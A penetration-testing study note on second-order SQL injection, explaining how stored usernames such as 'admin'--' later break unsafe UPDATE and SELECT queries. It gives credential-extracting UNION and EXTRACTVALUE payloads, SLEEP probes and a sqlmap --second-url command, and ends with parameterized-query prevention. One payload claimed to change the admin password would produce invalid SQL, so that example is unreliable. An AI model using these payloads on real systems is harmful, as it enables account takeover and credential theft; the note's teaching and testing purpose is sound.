---
tags: [vapt, sqli, advanced]
difficulty: advanced
module: "06 - SQL Injection"
topic: "06.08 Second-Order SQLi (Stored SQLi)"
---

# 06.08 — Second-Order SQLi (Stored SQLi)

## What is Second-Order SQLi?

In first-order (classic) SQLi, the payload is injected and executed in the same request. In second-order SQLi, the malicious input is **stored in the database** during one request, then **retrieved and used unsafely** in a subsequent SQL query — triggered by a different action, sometimes by a different user entirely.

```
FIRST-ORDER (CLASSIC):
  Request → Payload → SQL Query → Result (same request cycle)

SECOND-ORDER (STORED):
  Request 1: payload stored safely → DB ← "O'Brien" stored as-is
  Request 2: "O'Brien" retrieved from DB and used in new SQL query
             SQL: UPDATE users SET email='{name}' WHERE id=1
             SQL: UPDATE users SET email='O'Brien' WHERE id=1
                                              ↑ NOW BREAKS! SQLi!
```

---

## Why Second-Order SQLi is Tricky

```
COMMON MISTAKE:
  Developer sanitizes input going IN (parameterized INSERT)
  But trusts data coming OUT of DB (raw concatenation in SELECT/UPDATE)
  
  Assumption: "If it's in my database, it must be safe"
  Reality: The database stores whatever you put in — injection comes later!

WHY SCANNERS MISS IT:
  → Automated scanners test input → output in same request
  → Second-order SQLi payload is stored, not reflected
  → Trigger is a different endpoint, different action
  → May require specific user interaction to trigger
  → Requires understanding the application flow
```

---

## Classic Example: Username in Profile Update

```
SCENARIO:
  1. Register with username:  admin'--
  2. Login with that username
  3. Change your password
  
  REGISTRATION (uses parameterized query, safe):
    INSERT INTO users (username, password) VALUES (?, ?)
    → username = "admin'--" stored literally in DB
    
  CHANGE PASSWORD (uses concatenation, VULNERABLE):
    $username = get_current_user_from_session();  // gets "admin'--" from DB
    $sql = "UPDATE users SET password='" . $new_pass . "' WHERE username='" . $username . "'";
    
    SQL EXECUTED:
    UPDATE users SET password='newpass' WHERE username='admin'--'
                                                         ↑ COMMENT! ignores rest!
    
    EFFECT: Changes the ADMIN's password, not ours!
```

---

## Another Classic: Username in Email Search

```
SCENARIO:
  1. Register username: ' UNION SELECT password FROM users WHERE username='admin'--
  2. Application later does:
     SELECT email FROM users WHERE username='{our_stored_username}'
  
  SQL EXECUTED:
  SELECT email FROM users WHERE username='' UNION SELECT password FROM users WHERE username='admin'--'
  
  → Returns admin's password hash as "email"!
```

---

## Finding Second-Order SQLi

```
WHERE TO LOOK:

1. USER-CONTROLLED DATA STORED IN DB:
   - Username, display name, bio, address
   - Any profile fields
   - Comments, posts, messages
   - File names (if used in SQL)
   - Email addresses

2. WHERE STORED DATA IS REUSED IN SQL:
   - Profile update functionality
   - Password reset ("UPDATE users WHERE username=stored_value")
   - User dashboard queries
   - Admin user management ("SELECT * WHERE username=value_from_db")
   - Logging/audit queries
   - Report generation

3. TEST BY REGISTERING WITH SQL PAYLOADS:
   Username: admin'--
   Username: test' AND SLEEP(5)--
   Username: test' AND 1=CONVERT(INT,'a')--
   
   Then: trigger every action that might use this value in SQL
```

---

## Testing Methodology

```bash
# STEP 1: Register/create account with SQLi payload in name fields
# payload: test' AND SLEEP(5)--

# STEP 2: Log in as that user

# STEP 3: Trigger every feature that uses your profile data:
#   - View your profile
#   - Update your profile
#   - Change your password
#   - Search for yourself
#   - Export your data
#   - Admin viewing your account
#   - Report generation mentioning your username
#   - Any API endpoint using stored data

# STEP 4: For each action, observe:
#   - Does the page take 5+ seconds? (Time-based triggered!)
#   - Do errors appear in response?
#   - Does behavior differ from normal?

# STEP 5: If triggered, identify which field + which action caused it

# STEP 6: Escalate with data-extracting payload:
# Register username: test' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT password FROM users WHERE username='admin')))--
# Trigger the same action → error shows admin password!
```

---

## Real-World Example: HackerOne Reports

```
EXAMPLE REPORT: Password Reset Second-Order SQLi

SETUP:
  1. Register with email: victim@target.com
  2. Register with username: admin'--
  
TRIGGER:
  3. Request password reset
  4. App runs: 
     $user = db_query("SELECT * FROM users WHERE email='victim@target.com'");
     $username = $user['username'];  // = "admin'--"
     $sql = "UPDATE users SET reset_token='" . $token . "' WHERE username='" . $username . "'";
  
  5. SQL: UPDATE users SET reset_token='xyz' WHERE username='admin'--'
           → Sets reset_token for ADMIN user!
  
  6. Use /reset?token=xyz → reset admin's password!
  
IMPACT: Authentication bypass, account takeover
CVSS: 9.8 Critical
```

---

## Exploiting Second-Order SQLi

```sql
-- SCENARIO: Username used in UPDATE query unsafely

-- STEP 1: Register with payload username:
-- username = test' WHERE username='admin'--

-- STEP 2: Trigger password change
-- VULNERABLE CODE: "UPDATE users SET password='" + new_pass + "' WHERE username='" + stored_username + "'"
-- EXECUTED SQL: UPDATE users SET password='newpass' WHERE username='test' WHERE username='admin'--'
-- → CHANGES ADMIN PASSWORD!

-- STEP 3: Login as admin with new password

-- ALTERNATIVE PAYLOAD - Extract data via error:
-- username = test' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT GROUP_CONCAT(username,':',password) FROM users)))--
-- Trigger any SQL query using this username → error reveals all credentials!
```

---

## Automated Detection (Difficult!)

```bash
# SQLMAP HAS LIMITED SECOND-ORDER SUPPORT:
# Requires specifying the storage URL and trigger URL

sqlmap -u "https://target.com/register" \
  --data="username=*&password=test&email=test@test.com" \
  --second-url="https://target.com/profile" \
  -p username

# EXPLANATION:
# --second-url: the URL that uses the stored data (trigger)
# sqlmap stores payload in first URL, then fetches second URL to check for injection

# BURP SUITE APPROACH:
# 1. Record registration request in Burp Repeater
# 2. Add SQLi payload in username field
# 3. Record profile page request in another Repeater tab
# 4. Manually analyze response differences

# MANUAL IS OFTEN REQUIRED for this vulnerability type
```

---

## Prevention (For Defenders)

```
WRONG ASSUMPTION:
  "Data from our own database is safe to use in SQL"

CORRECT APPROACH:
  Use parameterized queries for EVERY SQL statement, including:
  - UPDATE queries
  - SELECT queries using data from previous DB query
  - Any query where the value came from storage, not just current input
  
CORRECT CODE:
  $username = get_current_username();  // from session/DB
  $stmt = $pdo->prepare("UPDATE users SET password=? WHERE username=?");
  $stmt->execute([$new_pass, $username]);
  // Username is treated as DATA even though it came from the database
```

---

## Related Notes
- [[01 - What is SQL Injection]] — SQLi fundamentals
- [[03 - Error-Based SQLi]] — extracting data from errors (use in second-order)
- [[06 - Blind SQLi Time-Based]] — confirming second-order via timing
- [[22 - Manual SQLi Testing Methodology]] — testing approach
